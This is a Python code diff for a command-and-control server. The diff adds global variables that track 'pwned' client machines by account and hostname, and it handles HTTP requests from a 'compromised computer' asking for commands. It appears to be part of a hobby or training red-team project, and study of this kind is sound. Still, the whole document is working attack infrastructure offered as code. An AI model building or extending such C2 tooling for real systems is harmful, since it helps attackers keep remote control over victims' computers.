@@ -3,6 +3,8 @@
 from http import server
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
+from c2_client import client
+
 # Port c2 server listens on
 PORT = 80
 
@@ -25,7 +27,10 @@ class C2Handler(BaseHTTPRequestHandler):
         """ This method handles all HTTP GET requests that
         arrive at the c2 server."""
 
-        #Follow this code block when the compromised computer is requesting a command
+        # These variables must be global as they will often be updated via multiple sessions
+        global active_session, client_account, client_hostname, pwned_dict, pwned_id
+
+        # Follow this code block when the compromised computer is requesting a command
         if self.path.startswith(CMD_REQUEST):
             client = self.path.split(CMD_REQUEST)[1]
             print(client)
@@ -40,15 +45,23 @@ class C2Handler(BaseHTTPRequestHandler):
         return
         # return super().log_request(code, size)()
 
-# Instantiate our HTTPServer object
-# noinspection PyTypeChecker
+# This maps to the client that we have a promt for
+active_session = 1
+
+# This is the account from the client belonging to the active session
+client_account = ""
+
+# This is the hostname from the client belonging to the active session
+client_hostname = ""
+
+# Used to uniquely count and track each client connecting in to the c2 server
+pwned_id = 0
+
+# Tracks all pwned clients; key = pwned_id and value is unique from each client (account@hostname@epoch time)
+pwned_dict = {}
+
+# Instantiate oour HTTPServer object
 server = HTTPServer((BIND_ADDR, PORT), C2Handler)
 
 # Run the server in an infinite loop
 server.serve_forever()
-
-
-# def run(server_class=HTTPServer, handler_class=BaseHTTPRequestHandler):
-# server_address = ('', 8000)
-# httpd = server_class(server_address, handler_class)
-# httpd.serve_forever()
